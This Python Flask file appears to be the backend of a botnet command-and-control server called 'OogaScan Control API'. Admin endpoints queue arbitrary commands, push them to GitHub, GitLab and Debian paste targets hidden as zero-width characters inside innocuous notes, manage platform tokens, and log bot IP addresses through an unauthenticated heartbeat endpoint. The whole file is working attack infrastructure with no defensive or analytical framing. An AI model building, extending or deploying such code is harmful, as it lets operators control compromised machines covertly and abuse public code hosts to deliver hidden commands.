#!/usr/bin/env python3
"""
OogaScan Control API — REST interface for the C2 dashboard.

Two roles:
  - admin: Full C2 control (push commands, manage repos, tokens, heartbeat, deploy)
  - lints: Read-only monitoring (view bots, repos, commands, status)

Auth via Bearer token in Authorization header.
"""

import os
import sys
import json
import time
import hashlib
import secrets
import threading
from pathlib import Path
from functools import wraps
from dataclasses import dataclass, field, asdict

from flask import Flask, request, jsonify, abort

import zwenc
from control import (
    ControlConfig, RepoTarget, CONTROL_CONFIG,
    _build_payload, _parse_repo_str, _repo_label,
    push_to_repo, pull_from_repo, check_repo_alive,
    debian_paste_create,
)

app = Flask(__name__)

API_CONFIG_FILE = str(Path(__file__).parent / "api_config.json")
BOTS_FILE = str(Path(__file__).parent / "bots.json")


@dataclass
class APIConfig:
    admin_token: str = ""
    lints_token: str = ""
    host: str = "0.0.0.0"
    port: int = 7443
    use_pad: bool = False

    def save(self, path: str = API_CONFIG_FILE):
        Path(path).write_text(json.dumps(asdict(self), indent=2))

    @classmethod
    def load(cls, path: str = API_CONFIG_FILE):
        if not Path(path).exists():
            cfg = cls(
                admin_token=secrets.token_hex(32),
                lints_token=secrets.token_hex(32),
            )
            cfg.save(path)
            return cfg
        raw = json.loads(Path(path).read_text())
        return cls(**{k: v for k, v in raw.items() if k in cls.__dataclass_fields__})


api_config = APIConfig.load()
control_config = ControlConfig.load()

_bots_lock = threading.Lock()
_bots: dict[str, dict] = {}


def _load_bots():
    global _bots
    if Path(BOTS_FILE).exists():
        try:
            _bots = json.loads(Path(BOTS_FILE).read_text())
        except (json.JSONDecodeError, OSError):
            _bots = {}


def _save_bots():
    try:
        Path(BOTS_FILE).write_text(json.dumps(_bots, indent=2))
    except OSError:
        pass


_load_bots()


def _get_role():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None
    token = auth[7:]
    if token == api_config.admin_token:
        return "admin"
    if token == api_config.lints_token:
        return "lints"
    return None


def require_admin(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if _get_role() != "admin":
            abort(403, description="Admin access required")
        return f(*args, **kwargs)
    return wrapper


def require_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if _get_role() is None:
            abort(401, description="Invalid or missing token")
        return f(*args, **kwargs)
    return wrapper


def _repo_to_dict(r: RepoTarget, idx: int) -> dict:
    return {
        "id": idx,
        "owner": r.owner,
        "repo": r.repo,
        "platform": r.platform,
        "branch": r.branch,
        "file_path": r.file_path,
        "alive": r.alive,
        "label": _repo_label(r),
    }


# ─── Admin Endpoints ──────────────────────────────────────────────────────────

@app.route("/api/admin/repos", methods=["GET"])
@require_admin
def admin_list_repos():
    repos = [_repo_to_dict(r, i) for i, r in enumerate(control_config.repos)]
    return jsonify({"repos": repos})


@app.route("/api/admin/repos", methods=["POST"])
@require_admin
def admin_add_repo():
    data = request.get_json(force=True)
    repo_str = data.get("repo", "")
    if not repo_str:
        return jsonify({"error": "Missing 'repo' field"}), 400
    try:
        repo = _parse_repo_str(repo_str)
        control_config.repos.append(repo)
        return jsonify({"added": _repo_to_dict(repo, len(control_config.repos) - 1)}), 201
    except ValueError as e:
        return jsonify({"error": str(e)}), 400


@app.route("/api/admin/repos/<int:idx>", methods=["DELETE"])
@require_admin
def admin_remove_repo(idx):
    if idx < 0 or idx >= len(control_config.repos):
        return jsonify({"error": "Invalid index"}), 404
    removed = control_config.repos.pop(idx)
    return jsonify({"removed": _repo_label(removed)})


@app.route("/api/admin/repos/check", methods=["POST"])
@require_admin
def admin_check_repos():
    results = []
    for r in control_config.repos:
        alive = check_repo_alive(r)
        r.alive = alive
        results.append({"label": _repo_label(r), "alive": alive})
    return jsonify({"results": results})


@app.route("/api/admin/commands", methods=["GET"])
@require_admin
def admin_list_commands():
    return jsonify({"commands": control_config.commands})


@app.route("/api/admin/commands", methods=["POST"])
@require_admin
def admin_add_command():
    data = request.get_json(force=True)
    cmd = data.get("cmd", "")
    if not cmd:
        return jsonify({"error": "Missing 'cmd' field"}), 400
    control_config.commands.append(cmd)
    return jsonify({"commands": control_config.commands, "total": len(control_config.commands)}), 201


@app.route("/api/admin/commands", methods=["DELETE"])
@require_admin
def admin_clear_commands():
    control_config.commands.clear()
    return jsonify({"commands": []})


@app.route("/api/admin/commands/<int:idx>", methods=["DELETE"])
@require_admin
def admin_remove_command(idx):
    if idx < 0 or idx >= len(control_config.commands):
        return jsonify({"error": "Invalid index"}), 404
    removed = control_config.commands.pop(idx)
    return jsonify({"removed": removed, "commands": control_config.commands})


@app.route("/api/admin/push", methods=["POST"])
@require_admin
def admin_push():
    data = request.get_json(silent=True) or {}
    target_idx = data.get("index")
    pad = data.get("pad", api_config.use_pad)

    payload = _build_payload(control_config)
    results = []

    if target_idx is not None:
        if target_idx < 0 or target_idx >= len(control_config.repos):
            return jsonify({"error": "Invalid index"}), 404
        r = control_config.repos[target_idx]
        ok = push_to_repo(r, control_config, payload, pad=pad)
        results.append({"label": _repo_label(r), "success": ok})
    else:
        alive_repos = [r for r in control_config.repos if r.alive]
        if not alive_repos:
            return jsonify({"error": "No alive repos. Run check first."}), 409
        for r in alive_repos:
            ok = push_to_repo(r, control_config, payload, pad=pad)
            results.append({"label": _repo_label(r), "success": ok})

    return jsonify({
        "payload_size": len(payload),
        "padded": pad,
        "results": results,
    })


@app.route("/api/admin/pull/<int:idx>", methods=["GET"])
@require_admin
def admin_pull(idx):
    if idx < 0 or idx >= len(control_config.repos):
        return jsonify({"error": "Invalid index"}), 404
    r = control_config.repos[idx]
    data = pull_from_repo(r, control_config)
    if data:
        return jsonify({"repo": _repo_label(r), "payload": data})
    return jsonify({"repo": _repo_label(r), "payload": None, "error": "No payload found"}), 404


@app.route("/api/admin/preview", methods=["GET"])
@require_admin
def admin_preview():
    payload = _build_payload(control_config)
    decoded = json.loads(payload)
    return jsonify({
        "payload": decoded,
        "size_bytes": len(payload),
        "zw_chars": len(payload) * 4,
    })


@app.route("/api/admin/paste", methods=["POST"])
@require_admin
def admin_create_paste():
    payload = _build_payload(control_config)
    content = "# Notes\n\nMiscellaneous.\n"
    injected = zwenc.inject(content, payload, pad=api_config.use_pad)
    paste_id = debian_paste_create(injected)
    if paste_id:
        control_config.repos.append(RepoTarget(
            owner="", repo=paste_id, platform="debian", branch="", file_path=""))
        return jsonify({
            "paste_id": paste_id,
            "url": f"https://paste.debian.net/{paste_id}",
        }), 201
    return jsonify({"error": "Failed to create paste"}), 502


@app.route("/api/admin/heartbeat", methods=["GET"])
@require_admin
def admin_get_heartbeat():
    return jsonify({
        "redirect": control_config.heartbeat_redirect,
        "tracking": control_config.heartbeat_tracking,
        "interval": control_config.heartbeat_interval,
    })


@app.route("/api/admin/heartbeat", methods=["PUT"])
@require_admin
def admin_set_heartbeat():
    data = request.get_json(force=True)
    if "redirect" in data:
        control_config.heartbeat_redirect = data["redirect"]
    if "tracking" in data:
        control_config.heartbeat_tracking = data["tracking"]
    if "interval" in data:
        control_config.heartbeat_interval = max(30, int(data["interval"]))
    return jsonify({
        "redirect": control_config.heartbeat_redirect,
        "tracking": control_config.heartbeat_tracking,
        "interval": control_config.heartbeat_interval,
    })


@app.route("/api/admin/tokens", methods=["PUT"])
@require_admin
def admin_set_tokens():
    data = request.get_json(force=True)
    if "github_token" in data:
        control_config.github_token = data["github_token"]
    if "gitlab_token" in data:
        control_config.gitlab_token = data["gitlab_token"]
    return jsonify({
        "github_token_set": bool(control_config.github_token),
        "gitlab_token_set": bool(control_config.gitlab_token),
    })


@app.route("/api/admin/padding", methods=["PUT"])
@require_admin
def admin_toggle_padding():
    data = request.get_json(silent=True) or {}
    if "enabled" in data:
        api_config.use_pad = bool(data["enabled"])
    else:
        api_config.use_pad = not api_config.use_pad
    api_config.save()
    return jsonify({"padding": api_config.use_pad})


@app.route("/api/admin/config/save", methods=["POST"])
@require_admin
def admin_save_config():
    control_config.save()
    api_config.save()
    return jsonify({"saved": True})


@app.route("/api/admin/bots", methods=["GET"])
@require_admin
def admin_list_bots():
    with _bots_lock:
        bot_list = []
        now = time.time()
        for bot_id, info in _bots.items():
            bot_list.append({
                "id": bot_id,
                "ip": info.get("ip", ""),
                "first_seen": info.get("first_seen", 0),
                "last_seen": info.get("last_seen", 0),
                "hits": info.get("hits", 0),
                "alive": (now - info.get("last_seen", 0)) < 600,
            })
        bot_list.sort(key=lambda b: b["last_seen"], reverse=True)
    return jsonify({"bots": bot_list, "total": len(bot_list)})


@app.route("/api/admin/bots/<bot_id>", methods=["DELETE"])
@require_admin
def admin_remove_bot(bot_id):
    with _bots_lock:
        if bot_id in _bots:
            del _bots[bot_id]
            _save_bots()
            return jsonify({"removed": bot_id})
    return jsonify({"error": "Bot not found"}), 404


@app.route("/api/admin/stats", methods=["GET"])
@require_admin
def admin_stats():
    now = time.time()
    with _bots_lock:
        total_bots = len(_bots)
        alive_bots = sum(1 for b in _bots.values() if (now - b.get("last_seen", 0)) < 600)
    alive_repos = sum(1 for r in control_config.repos if r.alive)
    return jsonify({
        "bots_total": total_bots,
        "bots_alive": alive_bots,
        "repos_total": len(control_config.repos),
        "repos_alive": alive_repos,
        "commands_queued": len(control_config.commands),
        "padding_enabled": api_config.use_pad,
    })


# ─── Lints (Client/Bot Monitoring) Endpoints ──────────────────────────────────

@app.route("/api/lints/status", methods=["GET"])
@require_auth
def lints_status():
    now = time.time()
    with _bots_lock:
        total_bots = len(_bots)
        alive_bots = sum(1 for b in _bots.values() if (now - b.get("last_seen", 0)) < 600)
    return jsonify({
        "bots_total": total_bots,
        "bots_alive": alive_bots,
        "repos_total": len(control_config.repos),
        "repos_alive": sum(1 for r in control_config.repos if r.alive),
        "commands_queued": len(control_config.commands),
    })


@app.route("/api/lints/bots", methods=["GET"])
@require_auth
def lints_list_bots():
    with _bots_lock:
        now = time.time()
        bot_list = []
        for bot_id, info in _bots.items():
            bot_list.append({
                "id": bot_id,
                "ip": info.get("ip", ""),
                "last_seen": info.get("last_seen", 0),
                "hits": info.get("hits", 0),
                "alive": (now - info.get("last_seen", 0)) < 600,
            })
        bot_list.sort(key=lambda b: b["last_seen"], reverse=True)
    return jsonify({"bots": bot_list})


@app.route("/api/lints/repos", methods=["GET"])
@require_auth
def lints_list_repos():
    repos = []
    for i, r in enumerate(control_config.repos):
        repos.append({
            "id": i,
            "platform": r.platform,
            "label": _repo_label(r),
            "alive": r.alive,
        })
    return jsonify({"repos": repos})


@app.route("/api/lints/commands", methods=["GET"])
@require_auth
def lints_list_commands():
    return jsonify({"commands": control_config.commands, "total": len(control_config.commands)})


# ─── Heartbeat Receiver (bots hit this endpoint) ──────────────────────────────

@app.route("/api/heartbeat/<bot_hash>", methods=["GET", "POST"])
def heartbeat_receiver(bot_hash):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    now = time.time()

    with _bots_lock:
        if bot_hash not in _bots:
            _bots[bot_hash] = {
                "ip": ip,
                "first_seen": now,
                "last_seen": now,
                "hits": 1,
            }
        else:
            _bots[bot_hash]["last_seen"] = now
            _bots[bot_hash]["hits"] += 1
            _bots[bot_hash]["ip"] = ip
        _save_bots()

    return "", 204


# ─── Auth Info ─────────────────────────────────────────────────────────────────

@app.route("/api/auth/whoami", methods=["GET"])
def whoami():
    role = _get_role()
    if role is None:
        return jsonify({"authenticated": False}), 401
    return jsonify({"authenticated": True, "role": role})


# ─── Error Handlers ───────────────────────────────────────────────────────────

@app.errorhandler(401)
def handle_401(e):
    return jsonify({"error": e.description}), 401


@app.errorhandler(403)
def handle_403(e):
    return jsonify({"error": e.description}), 403


@app.errorhandler(404)
def handle_404(e):
    return jsonify({"error": "Not found"}), 404


@app.errorhandler(500)
def handle_500(e):
    return jsonify({"error": "Internal server error"}), 500


def main():
    import argparse
    parser = argparse.ArgumentParser(description="OogaScan Control API")
    parser.add_argument("-H", "--host", default=api_config.host)
    parser.add_argument("-p", "--port", type=int, default=api_config.port)
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--gen-tokens", action="store_true",
                        help="Regenerate API tokens and exit")
    args = parser.parse_args()

    if args.gen_tokens:
        api_config.admin_token = secrets.token_hex(32)
        api_config.lints_token = secrets.token_hex(32)
        api_config.save()
        print(f"Tokens regenerated:")
        print(f"  Admin: {api_config.admin_token}")
        print(f"  Lints: {api_config.lints_token}")
        return

    print(f"""
  ╔══════════════════════════════════════════════╗
  ║  OogaScan Control API                        ║
  ║  Admin + Lints Dashboard Backend             ║
  ╚══════════════════════════════════════════════╝

  Host: {args.host}:{args.port}
  Admin token: {api_config.admin_token[:8]}...
  Lints token: {api_config.lints_token[:8]}...

  Endpoints:
    /api/admin/*       Full C2 control (admin token)
    /api/lints/*       Bot monitoring (any valid token)
    /api/heartbeat/*   Bot check-in (no auth)
    /api/auth/whoami   Token validation
""")

    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
